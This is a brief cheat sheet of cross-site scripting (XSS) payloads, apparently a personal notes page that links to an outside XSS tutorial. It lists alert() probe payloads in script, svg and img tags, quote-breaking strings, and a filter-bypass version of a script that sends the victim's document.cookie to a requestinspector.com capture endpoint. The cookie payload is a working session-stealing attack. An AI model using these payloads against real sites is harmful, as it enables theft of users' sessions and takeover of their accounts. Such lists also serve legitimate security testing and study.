Here im gonna present you some `XSS payloads`,if you want to learn what is a XSS injection,go and check out Ruulian work --> https://0xhorizon.eu/articles/xss/

## Basic Payloads:

```html
<script>alert(1)</script>
```

```html
<Svg OnLoad=alert(1)>
```

```html
<img src="" onerror="alert()">
```


## Bypass common filter

### Bypass http/https filter

Change your Payload like this:
```html
 - <script>document.location='https://requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie='+document.cookie</script>

 + <script>document.location='//requestinspector.com/p/xxxxxxxxxxxxxxxxxxxxxxxxxx?cookie='+document.cookie</script>
```

## Some Payloads

```html
'-alert(1)-'

'-alert(1)//
```
